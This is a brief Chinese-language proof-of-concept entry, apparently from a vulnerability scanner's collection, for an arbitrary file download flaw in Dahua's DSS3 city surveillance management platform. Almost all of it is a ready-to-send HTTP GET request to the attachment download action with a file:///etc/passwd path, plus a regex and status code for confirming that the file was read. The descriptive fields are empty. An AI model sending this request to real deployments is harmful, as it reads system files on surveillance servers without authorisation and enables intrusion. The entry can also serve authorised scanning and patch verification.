﻿# 大华城市安防监控系统平台管理 DSS3 任意文件下载漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?root)(?=.*?bin).*?$

> 上传文件定位：

> 验证文件来源：大华城市安防监控系统平台管理 DSS3 任意文件下载漏洞.poc
